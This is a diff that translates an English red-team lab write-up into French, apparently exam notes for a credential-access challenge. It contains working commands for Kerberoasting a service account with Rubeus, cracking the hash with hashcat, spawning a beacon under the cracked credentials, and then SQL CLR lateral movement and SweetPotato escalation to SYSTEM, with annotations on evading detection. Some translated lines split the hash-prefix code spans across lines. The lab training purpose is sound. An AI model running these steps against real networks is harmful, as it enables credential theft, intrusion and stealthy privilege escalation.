@@ -1,8 +1,8 @@
-# Credential Access Challenge Solution commands  
+# Challenge Credential Access — commandes et explications  
 
->Opsec Safe way enumeration of all target accounts with not null SPN value set, not krbtgt account and not disabled accounts.  
+>Énumérer les comptes actifs possédant un **SPN**, en excluant `krbtgt` et les comptes désactivés.  
 
-## Enumeration  
+## Énumération des comptes  
 
 ```sh
 ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
@@ -10,9 +10,9 @@ ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=
 
 <img src="/images/credential-access-challenge01.png" width=860>  
 
->Spot honey accounts not real to be noted in exam to skip accounts that can detect our presence in exam.
+>Repérer les éventuels comptes leurres (*honeypot*) afin de les distinguer des comptes réels.
 
->Obtain HASH value for only `mssql_svc` target account and not triggering the honeypot accounts, remaining undetected.  
+>Cibler uniquement le compte `mssql_svc` pour récupérer son hash Kerberos.  
 
 ```sh
 ppid 8276   //  (explorer.exe) → good parent for the sacrificial process
@@ -26,25 +26,29 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:
 
 <img src="/images/credential-access-challenge02.png" width=860>
 
-## Crack Hash  
+## Cassage du hash  
 
->Hashcat
+> Utiliser Hashcat pour tester le hash Kerberoasting.
 
 ```bash
 # Kerberoast hash — mode 13100 (NOT 18200 which is AS-REP roast)
 hashcat -a 0 -m 13100 /media/skippypeanut/2tb-hiksemi/hashcat-cracking/cred-acc-challenge.hash ../wordlists/rockyou.txt
 ```
 
-> **Common mistake:** `-m 18200` is AS-REP roasting (`$krb5asrep$` prefix). Kerberoasting produces `$krb5tgs$` hashes — use `-m 13100`. Using the wrong mode gives "Separator unmatched / No hashes loaded".
+> **Erreur fréquente :** le mode `18200` correspond à l’AS-REP Roasting (`$krb5asrep
 
-| Mode | Attack | Hash prefix | Rubeus command |
+> ). Pour le hash Kerberoasting `$krb5tgs
+
+>  de cet exemple, utiliser `13100`. Un mauvais mode peut produire `Separator unmatched / No hashes loaded`.
+
+| Mode | Attaque | Préfixe du hash | Commande Rubeus |
 |------|--------|-------------|----------------|
 | `13100` | Kerberoasting | `$krb5tgs$23$*` | `kerberoast /user:mssql_svc /nowrap` |
 | `18200` | AS-REP Roasting | `$krb5asrep$23$` | `asreproast /format:hashcat /nowrap` |
 
-> **[2026-04-17] Lab result:** `mssql_svc` cracked — `Passw0rd!`
+> **Résultat du lab du 17/04/2026 :** mot de passe `Passw0rd!` retrouvé pour `mssql_svc`.
 
-## Credential Access Obtained
+## Utiliser les identifiants obtenus
 
 ```cs
 spawnas CONTOSO\mssql_svc Passw0rd! tcp-local
@@ -53,15 +57,15 @@ spawnas CONTOSO\mssql_svc Passw0rd! tcp-local
 [04/17 18:09:03] [+] established link to child beacon: 10.10.121.108
 ```  
 
-## Post Exploitation  
+## Post-Exploitation  
 
-> **Lab environment note:** This challenge lab contains only a domain controller — no SQL servers are provisioned. Steps marked `[EXAM DAY]` are not executable here but are the expected next actions when `mssql_svc` is obtained in a full exam environment where SQL servers exist.
+> **Contexte du lab :** seul un Domain Controller est présent, sans SQL Server. Les étapes `[EXAM DAY]` illustrent un environnement plus complet et ne sont pas exécutables dans ce challenge.
 
-Loaded script `C:\Tools\SQL-BOF\SQL\SQL.cna`
+Script SQL-BOF chargé : `C:\Tools\SQL-BOF\SQL\SQL.cna`.
 
 <img src="/images/credential-access-challenge03.png" width=860>
 
-### Step 1 — Situational Awareness on mssql_svc Beacon
+### Vérifier le contexte du Beacon `mssql_svc`
 
 ```cs
 beacon> getuid                        // OPSEC-🟢SAFE — built-in, no child process
@@ -71,9 +75,9 @@ beacon> process_browser               // OPSEC-🟢SAFE — built-in GUI tab, no
 beacon> powerpick whoami /priv        // OPSEC-🟠CAUTION — fork & run (spawns spawnto process)
 ```
 
-> **SeImpersonatePrivilege present?** SQL service accounts run as a service identity and almost always have `SeImpersonatePrivilege`. This opens the SweetPotato privilege escalation path directly to SYSTEM without needing a separate service registry exploit.
+> **Vérifier `SeImpersonatePrivilege` :** la présence de ce privilège dépend de la configuration du compte et peut ouvrir une possibilité de Privilege Escalation vers SYSTEM.
 
-### Step 2 — File System Enumeration
+### Énumérer le système de fichiers
 
 ```cs
 beacon> file_browser                                         // OPSEC-🟢SAFE — built-in GUI, no child process
@@ -82,7 +86,7 @@ beacon> ls C:\Users\mssql_svc\Documents                      // OPSEC-🟢SAFE �
 beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-🟢SAFE — built-in beacon command
 ```
 
-### Step 3 — [EXAM DAY] SQL Server Enumeration
+### [EXAM DAY] Énumérer les SQL Server
 
 ```cs
 // Enumerate SQL instances via LDAP SPN query
@@ -96,7 +100,7 @@ beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE 
 beacon> sql-links lon-db-1                                    // OPSEC-🟢SAFE — SQL BOF, no child process
 ```
 
-### Step 4 — [EXAM DAY] SQL CLR Payload for Lateral Movement
+### [EXAM DAY] Lateral Movement avec SQL CLR
 
 ```cs
 beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — confirm sysadmin before proceeding
@@ -108,7 +112,7 @@ beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\
 beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-🟢SAFE — connects to waiting SMB beacon, no new process
 ```
 
-### Step 5 — [EXAM DAY] Privilege Escalation via SeImpersonatePrivilege
+### [EXAM DAY] Privilege Escalation avec `SeImpersonatePrivilege`
 
 ```cs
 // SweetPotato — payload must be pre-staged on the SQL host as tcp-local EXE
@@ -117,13 +121,13 @@ beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:
 beacon> connect localhost 1337                                // OPSEC-🟢SAFE — links to SYSTEM beacon over TCP, no new process
 ```
 
-### Step 6 — [EXAM DAY] Cleanup SQL CLR
+### [EXAM DAY] Nettoyer SQL CLR
 
 ```cs
 beacon> sql-disableclr lon-db-1                               // OPSEC-🟠CAUTION — reverts sp_configure change, logged in SQL audit
 ```
 
-### Decision Flow — What to Do After mssql_svc Beacon
+### Aide-mémoire après l’obtention du Beacon `mssql_svc`
 
 ```
 mssql_svc beacon obtained
